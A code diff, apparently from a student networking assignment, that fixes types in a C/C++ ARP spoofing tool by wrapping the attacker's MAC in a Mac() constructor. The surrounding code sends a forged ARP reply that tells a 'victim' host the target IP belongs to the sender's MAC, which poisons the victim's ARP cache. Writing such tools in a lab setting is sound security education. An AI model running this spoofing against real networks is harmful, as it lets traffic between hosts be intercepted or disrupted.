@@ -12,7 +12,6 @@
 #define size 6
 
 static uint8_t getmymac[size];
-//Mac getmymac[size];
 
 #pragma pack(push, 1)
 struct EthArpPacket{
@@ -24,7 +23,8 @@ struct EthArpPacket{
 struct ArpHdr *arp_hddr;
 
 //int getmacaddr(char *dev)
-char* getmacaddr(char *dev)
+Mac getmacaddr(char *dev) // gilgil update
+//char* getmacaddr(char *dev)
 {
 	int fd;
 	struct ifreq ifr;
@@ -99,14 +99,14 @@ int main(int argc, char* argv[]){
 	//ipaddr = getmyipaddr(dev); //get my ip address!
 
 	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // victim , mac(broadcast)
-	packet.eth_.smac_ = getmymac; // getmacaddr -> getmymac
+	packet.eth_.smac_ = Mac(getmymac); // getmacaddr -> getmymac
 	packet.eth_.type_ = htons(EthHdr::Arp);
 	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
 	packet.arp_.pro_ = htons(EthHdr::Ip4);
 	packet.arp_.hln_ = Mac::SIZE;
 	packet.arp_.pln_ = Ip::SIZE;
 	packet.arp_.op_ = htons(ArpHdr::Request); // request or reply
-	packet.arp_.smac_ = getmymac; // getmacaddr -> getmymac
+	packet.arp_.smac_ = Mac(getmymac); // getmacaddr -> getmymac
 	packet.arp_.sip_ = htonl(Ip(getmyipaddr(dev))); // getmyipaddr
 	packet.arp_.tmac_ = Mac("ff:ff:ff:ff:ff:ff"); // victim, mac(broadcast)
 	packet.arp_.tip_ = htonl(Ip(sip)); // host victim ip
@@ -139,14 +139,14 @@ int main(int argc, char* argv[]){
 		if(ntohs(eth_hdr->type_) == 0x0806 && ntohs(arp_hddr->op_) == ArpHdr::Reply){
 			EthArpPacket packet;
 			packet.eth_.dmac_ = eth_hdr->smac_; // victim
-			packet.eth_.smac_ = getmymac; // getmacaddr -> getmymac
+			packet.eth_.smac_ = Mac(getmymac); // getmacaddr -> getmymac
 			packet.eth_.type_ = htons(EthHdr::Arp);
 			packet.arp_.hrd_ = htons(ArpHdr::ETHER);
 			packet.arp_.pro_ = htons(EthHdr::Ip4);
 			packet.arp_.hln_ = Mac::SIZE;
 			packet.arp_.pln_ = Ip::SIZE;
 			packet.arp_.op_ = htons(ArpHdr::Reply); // request or reply
-			packet.arp_.smac_ = getmymac; // getmacaddr -> getmymac
+			packet.arp_.smac_ = Mac(getmymac); // getmacaddr -> Mac(getmymac);
 			packet.arp_.sip_ = htonl(Ip(tip)); // target ip
 			packet.arp_.tmac_ = eth_hdr->smac_; // host mac
 			packet.arp_.tip_ = htonl(Ip(sip)); // sender ip
